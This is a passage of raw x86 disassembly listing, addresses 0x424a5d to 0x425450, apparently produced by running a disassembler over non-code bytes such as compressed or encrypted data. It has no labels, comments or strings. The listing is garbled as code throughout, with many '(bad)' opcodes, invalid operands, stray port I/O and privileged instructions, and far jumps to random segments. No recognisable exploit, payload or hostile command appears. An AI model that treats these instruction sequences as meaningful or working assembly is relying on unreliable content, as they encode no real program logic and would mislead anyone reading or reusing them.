  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    bh,BYTE PTR [eax-0x7c]
  424a64:	jge    0x424a95
  424a66:	mov    DWORD PTR [bx+di],eax
  424a69:	add    BYTE PTR [eax],al
  424a6b:	add    DWORD PTR [eax],eax
  424a6d:	add    BYTE PTR [ebx+0x29],dl
  424a70:	imul   cl
  424a72:	xor    al,0xb2
  424a74:	fistp  QWORD PTR [esi+0x648aa2dd]
  424a7a:	stc    
  424a7b:	dec    edi
  424a7c:	adc    al,0xad
  424a7e:	rol    DWORD PTR [edi+eiz*2],1
  424a81:	mov    bl,0xa0
  424a83:	jns    0x424a74
  424a85:	ins    DWORD PTR es:[edi],dx
  424a86:	add    eax,0x7ee7a9a7
  424a8b:	out    dx,al
  424a8c:	pop    ebp
  424a8d:	lods   eax,DWORD PTR ds:[esi]
  424a8e:	in     al,dx
  424a8f:	pop    ebp
  424a90:	enter  0xfc25,0x3
  424a94:	cmp    esp,ecx
  424a96:	cmp    bh,al
  424a98:	dec    ebx
  424a99:	test   BYTE PTR [ebx-0x7b],al
  424a9c:	adc    dh,BYTE PTR [ecx+edi*2]
  424a9f:	xchg   ebx,eax
  424aa0:	inc    ebx
  424aa1:	call   0x999a:0x8f717ff1
  424aa8:	mov    ah,0x5e
  424aaa:	test   eax,0xfe815e9e
  424aaf:	pop    ebp
  424ab0:	mov    WORD PTR [eax+0x9],es
  424ab3:	icebp  
  424ab4:	fldcw  WORD PTR [edi]
  424ab6:	enter  0x4e5b,0x21
  424aba:	out    dx,al
  424abb:	ja     0x424b33
  424abd:	arpl   WORD PTR [edx-0x74360382],sp
  424ac3:	push   0x2f8489e6
  424ac8:	lea    edx,[esi+0x5eec4ff8]
  424ace:	push   0x497729d6
  424ad3:	xor    ecx,DWORD PTR [edx+0x70]
  424ad6:	jle    0x424b2e
  424ad8:	push   ecx
  424ad9:	dec    eax
  424ada:	lock imul ecx,ecx,0x1f
  424ade:	mov    eax,0xbe03e0c9
  424ae3:	mov    gs,ecx
  424ae5:	nop
  424ae6:	dec    ecx
  424ae7:	sbb    DWORD PTR [ebx+ecx*1+0x6fe6f937],ebp
  424aee:	sub    bh,0xe9
  424af1:	call   0xd4aa:0xfd683299
  424af8:	push   edx
  424af9:	stos   DWORD PTR es:[edi],eax
  424afa:	fadd   QWORD PTR [edi-0x7b]
  424afd:	or     al,0x6f
  424aff:	mov    dh,0xe
  424b01:	inc    eax
  424b02:	lds    edx,FWORD PTR [eax-0x45]
  424b05:	test   al,0xbd
  424b07:	mov    ebx,DWORD PTR [edi]
  424b09:	movq   QWORD PTR [esi+0x5b],mm4
  424b0d:	adc    DWORD PTR [ebp+0x75],ebp
  424b10:	xor    WORD PTR [eax+0x6742b1a],si
  424b17:	ins    DWORD PTR es:[edi],dx
  424b18:	pop    eax
  424b19:	push   edx
  424b1a:	cmp    ch,BYTE PTR [edx+edx*8-0x232e7212]
  424b21:	or     edi,esp
  424b23:	add    eax,DWORD PTR [esi+0x4e]
  424b26:	push   ds
  424b27:	pop    eax
  424b28:	push   cs
  424b29:	imul   DWORD PTR [edx+0x72b9d62]
  424b2f:	push   eax
  424b30:	and    eax,0xcc3e9792
  424b35:	neg    BYTE PTR [edx+0x74]
  424b38:	add    BYTE PTR [ebx+0x3d3ffb1],cl
  424b3e:	jmp    0xf6b9:0x5a4d7f87
  424b45:	sti    
  424b46:	push   cs
  424b47:	jne    0x424ba8
  424b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b4a:	sbb    eax,0xcf95b6e2
  424b4f:	gs jno 0x424b89
  424b52:	test   esp,esp
  424b54:	pop    esp
  424b55:	inc    esp
  424b56:	scas   eax,DWORD PTR es:[edi]
  424b57:	out    0x7c,al
  424b59:	mov    ds:0xd19f8acb,al
  424b5e:	aaa    
  424b5f:	push   ds
  424b60:	stos   DWORD PTR es:[edi],eax
  424b61:	mov    esi,0x1257b807
  424b66:	mov    DWORD PTR [edi+0x60484844],0xe89b
	...
  424bd4:	add    BYTE PTR [eax],al
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	and    eax,0x674c756c
  424be7:	mov    al,BYTE PTR [ecx]
  424be9:	add    BYTE PTR [eax],al
  424beb:	add    DWORD PTR [eax],eax
  424bed:	add    bl,bh
  424bef:	dec    edx
  424bf0:	mov    WORD PTR [ecx+edi*4+0x2d],cs
  424bf4:	push   0x68ea80ef
  424bf9:	(bad)  
  424bfc:	in     al,dx
  424bfd:	sti    
  424bfe:	in     eax,0x7c
  424c00:	jmp    0x424bfb
  424c02:	add    DWORD PTR [ebx+esi*8+0x7b],ebx
  424c06:	mov    ch,0xec
  424c08:	pop    esi
  424c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c0a:	inc    esi
  424c0b:	jne    0x424ba7
  424c0d:	iret   
  424c0e:	sar    DWORD PTR [ebp+0x1358b9d7],1
  424c14:	nop
  424c15:	jmp    0x424c81
  424c17:	outs   dx,BYTE PTR ds:[esi]
  424c18:	out    dx,al
  424c19:	xor    eax,0xde809ad3
  424c1e:	pop    ebp
  424c1f:	xchg   DWORD PTR [edx+0x5f1a5762],eax
  424c25:	aam    0x75
  424c27:	stos   DWORD PTR es:[edi],eax
  424c28:	xor    dh,bh
  424c2a:	sar    edx,0xab
  424c2d:	test   al,0x7f
  424c2f:	inc    edi
  424c30:	lea    ebx,[ebp-0x46]
  424c33:	sub    BYTE PTR [eax-0x2f9e477d],al
  424c39:	push   ecx
  424c3a:	jg     0x424c25
  424c3c:	(bad)  
  424c3d:	pop    ebp
  424c3e:	mov    eax,ds:0xfccfa29
  424c43:	loope  0x424cab
  424c45:	push   edi
  424c46:	daa    
  424c47:	mov    dh,0x9
  424c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c4a:	dec    edi
  424c4b:	mov    esi,0x16614cdf
  424c50:	test   eax,0xfd6f9bf2
  424c55:	push   edx
  424c56:	and    esp,DWORD PTR [eax]
  424c58:	int    0x86
  424c5a:	not    BYTE PTR [ebp+0x7b69052d]
  424c60:	mov    ch,0x3f
  424c62:	xchg   esp,eax
  424c63:	push   0xffffffb2
  424c65:	mov    bh,0x71
  424c67:	push   0xffffff85
  424c69:	int3   
  424c6a:	mov    BYTE PTR [edx-0x42],dh
  424c6d:	hlt    
  424c6e:	into   
  424c6f:	in     al,dx
  424c70:	nop
  424c71:	pop    eax
  424c72:	jl     0x424c30
  424c74:	pop    esi
  424c75:	xchg   esp,eax
  424c76:	cld    
  424c77:	xchg   ecx,eax
  424c78:	and    dl,cl
  424c7a:	lea    esi,[eax-0x75dd6ef7]
  424c80:	pop    es
  424c81:	(bad)  
  424c82:	mov    eax,0xece185ef
  424c87:	jns    0x424c76
  424c89:	or     eax,DWORD PTR [ebx+0x4836b57f]
  424c8f:	in     eax,dx
  424c90:	push   es
  424c91:	mov    ebx,0x936d1ae7
  424c96:	int3   
  424c97:	sub    edx,ecx
  424c99:	xor    al,0xe
  424c9b:	and    eax,0xc3052702
  424ca0:	xchg   BYTE PTR [ebx+0xf],dh
  424ca3:	and    al,0x1a
  424ca5:	dec    edx
  424ca6:	and    al,0xb2
  424ca8:	and    DWORD PTR [edx],ecx
  424caa:	jno    0x424c91
  424cac:	jecxz  0x424c92
  424cae:	inc    ebx
  424caf:	or     eax,0x2ccf282a
  424cb4:	dec    edx
  424cb5:	sbb    BYTE PTR [ecx],cl
  424cb7:	pop    ss
  424cb8:	bound  esi,QWORD PTR gs:[esi-0x3a]
  424cbc:	mov    ds:0x83bbc524,eax
  424cc1:	or     al,0xc7
  424cc3:	scas   al,BYTE PTR es:[edi]
  424cc4:	add    esi,esp
  424cc6:	les    ebx,FWORD PTR [eax]
  424cc8:	popf   
  424cc9:	or     BYTE PTR [eax-0x43],al
  424ccc:	push   esp
  424ccd:	das    
  424cce:	mov    dl,0xf7
  424cd0:	inc    eax
  424cd1:	mov    esp,0x6d7254b3
  424cd6:	dec    eax
  424cd7:	and    edx,DWORD PTR [edx-0x767d7969]
  424cdd:	call   0x637f:0x80c24e33
  424ce4:	ror    DWORD PTR [edi+0x46],cl
  424ce7:	dec    edx
  424ce8:	add    DWORD PTR [edi*2+0x8d5bf9],0x0
	...
  424d54:	add    BYTE PTR [eax],al
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx-0x6787ae58]
  424d64:	fmul   st,st(6)
  424d66:	mov    eax,DWORD PTR [bx+di]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    BYTE PTR [eax+0x16741005],dh
  424d73:	cdq    
  424d74:	xor    eax,0xfcf7aca8
  424d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d7a:	and    eax,0xd5e03fea
  424d7f:	data16 adc al,ch
  424d82:	iret   
  424d83:	pop    edi
  424d84:	not    DWORD PTR [edx-0x708cb0d4]
  424d8a:	popf   
  424d8b:	(bad)  
  424d8c:	mov    eax,DWORD PTR [ebp-0x78]
  424d8f:	pop    eax
  424d90:	push   esi
  424d91:	mov    dh,dh
  424d93:	add    esi,esi
  424d95:	inc    ecx
  424d96:	cdq    
  424d97:	add    bh,BYTE PTR [esi]
  424d99:	retf   0x1a4c
  424d9c:	out    0x2b,al
  424d9e:	mov    dl,0x3e
  424da0:	out    0x9,eax
  424da2:	adc    al,0xc
  424da4:	cmp    DWORD PTR [ebx+0x6a],esi
  424da7:	xor    BYTE PTR [eax-0x27],0xc8
  424dab:	fst    DWORD PTR [edi+0x2118e460]
  424db1:	pop    edx
  424db2:	xor    ebx,DWORD PTR [ecx]
  424db4:	mov    al,0xa8
  424db6:	mov    dl,0x13
  424db8:	test   al,0xe6
  424dba:	ficomp WORD PTR [ebp-0x50a4cb3]
  424dc0:	popf   
  424dc1:	or     al,0x70
  424dc3:	inc    edi
  424dc4:	cld    
  424dc5:	ror    BYTE PTR [ebx+0x3a],cl
  424dc8:	test   DWORD PTR [eax+0x5048a7d3],ebp
  424dce:	jb     0x424da4
  424dd0:	push   ds
  424dd1:	cmp    eax,0x11a8e10c
  424dd6:	js     0x424da4
  424dd8:	cld    
  424dd9:	jg     0x424d80
  424ddb:	leave  
  424ddc:	aad    0x4f
  424dde:	xlat   BYTE PTR ds:[ebx]
  424ddf:	bswap  esi
  424de1:	cmp    BYTE PTR [edi],al
  424de3:	adc    DWORD PTR [ecx],ebp
  424de5:	xor    al,ah
  424de7:	aaa    
  424de8:	adc    dh,cl
  424dea:	and    DWORD PTR [ebx+0x5efae916],eax
  424df0:	xchg   edi,eax
  424df1:	dec    edi
  424df2:	cmp    dh,BYTE PTR [eax]
  424df4:	nop
  424df5:	bound  ebx,QWORD PTR [ecx+ecx*1+0x80fac22]
  424dfc:	adc    edi,ebp
  424dfe:	cmp    ch,BYTE PTR [eax+edx*1+0x70]
  424e02:	xlat   BYTE PTR ds:[ebx]
  424e03:	push   ebp
  424e04:	(bad)  
  424e05:	xchg   edi,eax
  424e06:	xchg   BYTE PTR [ebp-0x59],ah
  424e09:	cld    
  424e0a:	mov    ?,WORD PTR [esi+eax*2]
  424e0d:	jns    0x424e2e
  424e0f:	xor    BYTE PTR [ebx],ah
  424e11:	mov    esi,0xcf4e33d
  424e16:	hlt    
  424e17:	push   ds
  424e18:	pop    ecx
  424e19:	jecxz  0x424da1
  424e1b:	fadd   DWORD PTR [edx-0x15a4061d]
  424e21:	pop    ecx
  424e22:	ss cmp edi,esp
  424e25:	pop    edi
  424e26:	mov    bl,0xed
  424e28:	retf   
  424e29:	mov    bh,0x63
  424e2b:	call   0x5244bda5
  424e30:	jbe    0x424e1d
  424e32:	xor    DWORD PTR [edi+0x11],0x53b49117
  424e39:	jle    0x424e6c
  424e3b:	frstor [ecx-0x64]
  424e3e:	and    DWORD PTR [ecx+esi*1],edx
  424e41:	dec    edx
  424e42:	mov    bl,0xaf
  424e44:	sub    al,0x8a
  424e46:	ficom  WORD PTR [esp+ebx*4+0x52]
  424e4a:	jbe    0x424dd3
  424e4c:	dec    eax
  424e4d:	mov    ecx,0x866bb9c4
  424e52:	jecxz  0x424e7d
  424e54:	jg     0x424ebe
  424e56:	fisubr DWORD PTR [eax+0x51]
  424e59:	pop    ebx
  424e5a:	xchg   esp,eax
  424e5b:	push   esi
  424e5c:	fucompp 
  424e5e:	xor    DWORD PTR [ebx],ebx
  424e60:	push   0xfffffff0
  424e62:	out    dx,eax
  424e63:	jp     0x424e50
  424e65:	adc    BYTE PTR [edx],al
  424e67:	xor    DWORD PTR [eax+0x5f],esp
  424e6a:	adc    dl,BYTE PTR [ebp+0x46a6]
	...
  424ed4:	add    BYTE PTR [eax],al
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424f3c
  424ee3:	add    BYTE PTR [ebx],bl
  424ee5:	mov    edx,0x18c67
  424eea:	add    BYTE PTR [ecx],al
  424eec:	add    BYTE PTR [eax],al
  424eee:	jle    0x424ec6
  424ef0:	mov    bl,BYTE PTR [ecx]
  424ef2:	imul   esi,eax,0xbe3cf4fe
  424ef8:	xor    al,0x38
  424efa:	pop    ss
  424efb:	xor    al,0xb6
  424efd:	imul   esp,DWORD PTR [ebp+0x4],0xffffffa0
  424f01:	and    eax,0x47d02507
  424f06:	cmp    eax,0xd82636d5
  424f0b:	add    edx,edi
  424f0d:	(bad)  
  424f0f:	inc    ecx
  424f10:	jb     0x424f6e
  424f12:	jmp    0x1ff6:0xcaf3ca24
  424f19:	mov    al,bh
  424f1b:	and    al,al
  424f1d:	jnp    0x424ef2
  424f1f:	cli    
  424f20:	imul   esp,DWORD PTR [eax+0x154bfe0e],0xffffffef
  424f27:	and    eax,edx
  424f29:	push   cs
  424f2a:	or     cl,cl
  424f2c:	inc    ebx
  424f2d:	dec    ebp
  424f2e:	sbb    al,0xbb
  424f30:	ins    BYTE PTR es:[edi],dx
  424f31:	push   0x6afb29f6
  424f36:	push   ds
  424f37:	fxch   st(2)
  424f39:	cmp    eax,0x279e8604
  424f3e:	out    0x66,al
  424f40:	enter  0xba72,0xea
  424f44:	or     eax,0xf94ce990
  424f49:	(bad)  
  424f4a:	fst    QWORD PTR [eax+0x4c]
  424f4d:	lahf   
  424f4e:	and    al,BYTE PTR [edx-0x1f]
  424f51:	in     eax,dx
  424f52:	pop    ebx
  424f53:	xchg   ch,al
  424f55:	mov    cl,0xb4
  424f57:	inc    esi
  424f58:	xor    esp,DWORD PTR [edx]
  424f5a:	push   cs
  424f5b:	arpl   WORD PTR [ecx+0x42cb4b94],cx
  424f61:	dec    edi
  424f62:	(bad)  
  424f63:	mov    edi,0xe4e1e780
  424f68:	popf   
  424f69:	jbe    0x424fd5
  424f6b:	adc    al,0xf6
  424f6d:	pop    eax
  424f6e:	aas    
  424f6f:	inc    eax
  424f70:	dec    esi
  424f71:	or     DWORD PTR [esi],eax
  424f73:	xor    dh,BYTE PTR [ebx+edx*8+0xd]
  424f77:	jb     0x424fe7
  424f79:	mov    esi,DWORD PTR [edi]
  424f7b:	jle    0x424f02
  424f7d:	xor    al,0xa0
  424f7f:	fs (bad) 
  424f81:	cld    
  424f82:	mov    edx,0x2341964d
  424f87:	pop    ebx
  424f88:	fidivr WORD PTR [edi+ecx*2-0x26]
  424f8c:	and    esp,ebx
  424f8e:	cmp    eax,0x1c83c1d
  424f93:	xchg   esp,eax
  424f94:	dec    edx
  424f95:	xor    esp,edi
  424f97:	fisub  DWORD PTR [eax+0x5b]
  424f9a:	dec    ebx
  424f9b:	xchg   esp,eax
  424f9c:	(bad)  
  424f9d:	ds into 
  424f9f:	stos   DWORD PTR es:[edi],eax
  424fa0:	jmp    0x1a09:0x676f0be0
  424fa7:	jno    0x424f7f
  424fa9:	das    
  424faa:	in     eax,dx
  424fab:	icebp  
  424fac:	lahf   
  424fad:	clc    
  424fae:	fist   WORD PTR [ecx+0x16238830]
  424fb4:	lea    eax,[ecx]
  424fb6:	and    eax,0x51b7ec7c
  424fbb:	dec    ecx
  424fbc:	out    dx,al
  424fbd:	stos   BYTE PTR es:[edi],al
  424fbe:	xchg   bl,ch
  424fc0:	pop    ebx
  424fc1:	jle    0x424f4c
  424fc3:	pop    ebx
  424fc4:	out    0xe3,eax
  424fc6:	mov    esi,0x47e17fe
  424fcb:	ss sub ch,dh
  424fce:	clc    
  424fcf:	xor    DWORD PTR [ebp+ecx*1+0x5c],eax
  424fd3:	adc    edx,eax
  424fd5:	pop    ds
  424fd6:	jno    0x424f83
  424fd8:	push   edi
  424fd9:	repnz sti 
  424fdb:	ja     0x424f6a
  424fdd:	sbb    DWORD PTR [edx+0xf],0x34
  424fe1:	mov    eax,0x3bb37782
  424fe6:	sbb    DWORD PTR [eax-0x55],edx
  424fe9:	pop    esp
  424fea:	or     dh,dh
  424fec:	and    DWORD PTR [edx+0x0],esp
	...
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	xchg   BYTE PTR [ebx+0x5c],ah
  425065:	and    DWORD PTR [edi-0x73],0x1000001
  42506c:	add    BYTE PTR [eax],al
  42506e:	push   esp
  42506f:	rol    DWORD PTR [esp+ebp*4-0x53],0x23
  425074:	daa    
  425075:	shl    BYTE PTR [esi],cl
  425077:	xchg   ebp,eax
  425078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425079:	or     ecx,ebx
  42507b:	cmp    ch,BYTE PTR [ebx]
  42507d:	jl     0x425070
  42507f:	xor    eax,0xb4aee5ec
  425084:	xlat   BYTE PTR ds:[ebx]
  425085:	popf   
  425086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425087:	sbb    cl,BYTE PTR [esi+ecx*2-0x6]
  42508b:	gs sbb bh,dl
  42508e:	fdiv   QWORD PTR ds:0xb2aef15f
  425094:	xchg   DWORD PTR [eax],ecx
  425096:	das    
  425097:	inc    eax
  425098:	pop    esi
  425099:	cli    
  42509a:	call   0xc063:0xff90fccf
  4250a1:	mov    eax,ds:0xef93934b
  4250a6:	fsub   QWORD PTR [eax+0x1ee0ebbb]
  4250ac:	sbb    al,BYTE PTR [edx+0xbd9a5fa]
  4250b2:	out    0xd2,eax
  4250b4:	ffreep st(7)
  4250b6:	fmul   QWORD PTR [esi]
  4250b8:	dec    ebx
  4250b9:	and    DWORD PTR [edi],ebp
  4250bb:	dec    eax
  4250bc:	push   es
  4250bd:	mov    edx,ebp
  4250bf:	xchg   ebp,eax
  4250c0:	xor    al,0xbe
  4250c2:	or     dl,BYTE PTR [ebx-0x2d]
  4250c5:	popa   
  4250c6:	cmp    DWORD PTR [ecx+0x29],ebp
  4250c9:	retf   0xfdf
  4250cc:	addr16 in al,0xee
  4250cf:	adc    DWORD PTR [ebp+0x55100071],ebx
  4250d5:	add    ax,0x3abd
  4250d9:	test   bl,0x5e
  4250dc:	or     al,0x13
  4250de:	and    edx,DWORD PTR [esi]
  4250e0:	fsub   st(5),st
  4250e2:	dec    eax
  4250e3:	ror    DWORD PTR [esi+0x69],1
  4250e6:	xchg   edi,eax
  4250e7:	xor    al,0xed
  4250e9:	dec    esi
  4250ea:	pop    edx
  4250eb:	dec    esi
  4250ec:	fsub   DWORD PTR [ecx-0x50062d1b]
  4250f2:	xchg   edx,eax
  4250f3:	repnz mov ebx,0x66ea43ba
  4250f9:	cld    
  4250fa:	sub    al,0x46
  4250fc:	pop    ss
  4250fd:	data16 mov BYTE PTR [edi-0x61148b99],ch
  425104:	aam    0x2d
  425106:	in     al,0x0
  425108:	xchg   ecx,eax
  425109:	(bad)  
  42510a:	mov    dh,0x1
  42510c:	add    al,0xc5
  42510e:	jns    0x425151
  425110:	pop    eax
  425111:	dec    eax
  425112:	inc    ebx
  425113:	dec    eax
  425114:	ins    DWORD PTR es:[edi],dx
  425115:	fidiv  DWORD PTR [ebp+0x2c]
  425118:	pushf  
  425119:	dec    eax
  42511a:	repz sbb dl,bh
  42511d:	mov    ss,WORD PTR [eax-0xfbc27c0]
  425123:	cli    
  425124:	bound  ebx,QWORD PTR [ecx+0x5df1a352]
  42512a:	xor    dh,BYTE PTR [ebx]
  42512c:	xchg   WORD PTR [edx],cx
  42512f:	add    ah,BYTE PTR [ecx+eiz*2-0x9]
  425133:	xchg   DWORD PTR [esi-0x4f],ebx
  425136:	sbb    esp,edi
  425138:	ror    DWORD PTR [eax],cl
  42513a:	loope  0x42514e
  42513c:	lds    edi,FWORD PTR [ecx]
  42513e:	sub    DWORD PTR ss:[edi],ebx
  425141:	sub    dh,BYTE PTR [eax-0x74]
  425144:	pop    ecx
  425145:	in     eax,dx
  425146:	rcr    DWORD PTR [ecx+0x2e],0x27
  42514a:	xchg   ecx,eax
  42514b:	cmp    DWORD PTR [esi],0x74f1f0b
  425151:	aas    
  425152:	sub    ecx,DWORD PTR [ecx+0x4d6e57e1]
  425158:	aaa    
  425159:	jle    0x4251c2
  42515b:	addr16 (bad) 
  42515e:	pop    ss
  42515f:	not    DWORD PTR [ebx+0x78406f75]
  425165:	mov    cl,0x83
  425167:	popf   
  425168:	loopne 0x4251a3
  42516a:	mov    ebx,0x2279b9
	...
  4251d3:	add    BYTE PTR [eax],al
  4251d5:	add    dh,bl
  4251d7:	adc    DWORD PTR [edi-0x15020dd],ebx
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0xddc5:0x220492e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    BYTE PTR [ecx-0x6e5a5fc0],al
  4251f3:	nop
  4251f4:	pop    es
  4251f5:	out    0x9c,eax
  4251f7:	jg     0x4251c1
  4251f9:	xchg   ebp,eax
  4251fa:	or     eax,0xca076b7c
  4251ff:	cmc    
  425200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425201:	dec    esp
  425202:	neg    ah
  425204:	sbb    eax,0xf578e30d
  425209:	cli    
  42520a:	sub    dh,BYTE PTR [esi]
  42520c:	leave  
  42520d:	mov    ds:0x531e9bf4,al
  425212:	sbb    al,0x7e
  425214:	dec    esi
  425215:	cdq    
  425216:	add    DWORD PTR [esi],ebx
  425218:	mov    al,ds:0xf35dd5f3
  42521d:	retf   
  42521e:	ja     0x425211
  425220:	add    DWORD PTR [edi],0xffffffe8
  425223:	call   0x123ffaa9
  425228:	hlt    
  425229:	aas    
  42522a:	pop    es
  42522b:	jl     0x4251fd
  42522d:	mov    ds:0x6ced504f,eax
  425232:	adc    dh,dl
  425234:	jb     0x4251c7
  425236:	inc    ecx
  425237:	shr    DWORD PTR [edi],0x39
  42523a:	call   0xd0adabc
  42523f:	add    esp,0x14
  425242:	xchg   ebx,ebp
  425244:	dec    eax
  425245:	cmc    
  425246:	lea    edi,[eax-0x2c]
  425249:	pop    ds
  42524a:	and    edx,DWORD PTR [edx-0x6e]
  42524d:	cdq    
  42524e:	inc    ecx
  42524f:	add    cl,dh
  425251:	je     0x425264
  425253:	retf   0x2ccb
  425256:	fdivr  DWORD PTR [edi]
  425258:	(bad)  
  425259:	pushf  
  42525a:	scas   eax,DWORD PTR es:[edi]
  42525b:	out    dx,al
  42525c:	adc    ebx,edi
  42525e:	loop   0x425227
  425260:	mov    ebp,0x3a9dd733
  425265:	icebp  
  425266:	or     dh,BYTE PTR [edx]
  425268:	ins    BYTE PTR es:[edi],dx
  425269:	es pop ebx
  42526b:	enter  0xe685,0xec
  42526f:	add    eax,0xb47da9c0
  425274:	fsubr  DWORD PTR [ecx+0x4]
  425277:	dec    ebp
  425278:	jge    0x4252ac
  42527a:	mov    al,0xb0
  42527c:	pop    eax
  42527d:	inc    esp
  42527e:	jno    0x425262
  425280:	sub    al,0xb2
  425282:	cmp    dh,BYTE PTR [edi+0x5c]
  425285:	call   0xedef6968
  42528a:	jbe    0x425253
  42528c:	push   eax
  42528d:	dec    DWORD PTR [eax+0x35017b66]
  425293:	ss int3 
  425295:	push   esp
  425296:	jge    0x42525d
  425298:	leave  
  425299:	jmp    0x93a7:0x2f1b2376
  4252a0:	xchg   esi,eax
  4252a1:	jmp    0x4ba36514
  4252a6:	int3   
  4252a7:	sub    eax,0xdcb993e9
  4252ac:	or     ah,BYTE PTR [esi+0x58]
  4252af:	mov    ds:0x538b19b3,al
  4252b4:	retf   
  4252b5:	fwait
  4252b6:	push   eax
  4252b7:	(bad)  
  4252b8:	xchg   esi,eax
  4252b9:	aas    
  4252ba:	inc    edx
  4252bb:	adc    eax,0xdf58c090
  4252c0:	sbb    ch,BYTE PTR [edx-0x31]
  4252c3:	into   
  4252c4:	repnz or al,0xd8
  4252c7:	fwait
  4252c8:	out    0xe3,eax
  4252ca:	cwde   
  4252cb:	jg     0x425273
  4252cd:	aad    0x6f
  4252cf:	xchg   ebx,eax
  4252d0:	push   edi
  4252d1:	lods   eax,DWORD PTR ds:[esi]
  4252d2:	dec    eax
  4252d3:	mov    eax,ds:0x4b7bf1b9
  4252d8:	hlt    
  4252d9:	adc    esi,esp
  4252db:	dec    edx
  4252dc:	retf   0xeba7
  4252df:	xchg   esp,eax
  4252e0:	ret    0x8efd
  4252e3:	loope  0x425340
  4252e5:	dec    ecx
  4252e6:	dec    eax
  4252e7:	mov    dl,0x1f
  4252e9:	mov    ebp,0x5cc31d63
	...
  425356:	lods   al,BYTE PTR ds:[esi]
  425357:	les    esi,FWORD PTR [ebx-0x32]
  42535a:	jnp    0x42535b
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	xchg   edx,eax
  425363:	daa    
  425364:	aad    0xa
  425366:	pop    DWORD PTR [bx+di]
  425369:	add    BYTE PTR [eax],al
  42536b:	add    DWORD PTR [eax],eax
  42536d:	add    BYTE PTR [ecx],dl
  42536f:	jns    0x4253b0
  425371:	push   cs
  425372:	xchg   ecx,eax
  425373:	setno  BYTE PTR [edi-0x142e1467]
  42537a:	je     0x4253cf
  42537c:	cmp    esp,DWORD PTR ds:0x6da6e730
  425382:	cmp    ebx,DWORD PTR [edx-0x16]
  425385:	mov    ds:0xd9b0ed92,al
  42538a:	icebp  
  42538b:	xlat   BYTE PTR ds:[ebx]
  42538c:	lds    edx,FWORD PTR ds:0x1bc77c44
  425392:	outs   dx,DWORD PTR ds:[esi]
  425393:	mov    dh,0xc1
  425395:	fistp  WORD PTR [edi-0x6e35583c]
  42539b:	fdiv   st(5),st
  42539d:	clc    
  42539e:	push   ebx
  42539f:	sahf   
  4253a0:	mov    eax,fs
  4253a2:	inc    ebx
  4253a3:	pushf  
  4253a4:	dec    ebp
  4253a5:	je     0x42537e
  4253a7:	rol    BYTE PTR ds:0xdd475a16,1
  4253ad:	jne    0x4253a7
  4253af:	out    dx,eax
  4253b0:	xchg   esp,eax
  4253b1:	adc    eax,DWORD PTR [ebx]
  4253b3:	(bad)  
  4253b4:	cli    
  4253b5:	stos   BYTE PTR es:[edi],al
  4253b6:	jae    0x4253a5
  4253b8:	jg     0x42539e
  4253ba:	xor    al,BYTE PTR [ecx-0x21654ef]
  4253c0:	std    
  4253c1:	cmp    BYTE PTR [edx-0x784ad27e],dl
  4253c7:	fsubr  QWORD PTR [esi+0x78]
  4253ca:	xchg   BYTE PTR [edx+0x6188070b],dh
  4253d0:	mov    dh,0xee
  4253d2:	xchg   ecx,eax
  4253d3:	rol    DWORD PTR [eax],1
  4253d5:	scas   eax,DWORD PTR es:[edi]
  4253d6:	inc    eax
  4253d7:	popf   
  4253d8:	es jne 0x4253e5
  4253db:	in     al,0xa3
  4253dd:	dec    ecx
  4253de:	push   cs
  4253df:	daa    
  4253e0:	mov    ebp,0xfef1c482
  4253e5:	ret    0xd538
  4253e8:	jg     0x425377
  4253ea:	sub    DWORD PTR [edx+edx*2-0x58],0x4ddce601
  4253f2:	(bad)  [edi+ebp*2-0x19]
  4253f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253f7:	xor    al,0xb2
  4253f9:	pop    esi
  4253fa:	cli    
  4253fb:	push   ebp
  4253fc:	fmulp  st(1),st
  4253fe:	push   ds
  4253ff:	arpl   ax,bx
  425401:	dec    esi
  425402:	xchg   ebx,eax
  425403:	scas   eax,DWORD PTR es:[edi]
  425404:	jecxz  0x4253b9
  425406:	call   0x77fe:0xe9504832
  42540d:	jbe    0x4253f4
  42540f:	js     0x425442
  425411:	pop    ecx
  425412:	daa    
  425413:	push   ecx
  425414:	pushf  
  425415:	aam    0x70
  425417:	add    bh,al
  425419:	mov    eax,0x828f34
  42541e:	idiv   DWORD PTR [esi]
  425420:	or     BYTE PTR [ebx+0x39],ch
  425423:	xchg   esp,eax
  425424:	sbb    al,0x8c
  425426:	test   al,0x9a
  425428:	mov    edi,0x5bcf900e
  42542d:	inc    eax
  42542e:	jns    0x4253c6
  425430:	jo     0x425445
  425432:	xor    bh,ah
  425434:	mov    edx,0x3d244d7
  425439:	mov    ?,WORD PTR [esp+eax*4]
  42543c:	adc    cl,BYTE PTR [edi-0x4b]
  42543f:	pop    es
  425440:	mov    edx,0x808aed20
  425445:	sub    ch,BYTE PTR [esp+esi*1]
  425448:	xchg   ebx,eax
  425449:	dec    esi
  42544a:	popa   
  42544b:	xchg   edi,eax
  42544c:	mul    cl
  42544e:	inc    esi
  42544f:	iret   
  425450:	and    eax,0x79465b5a
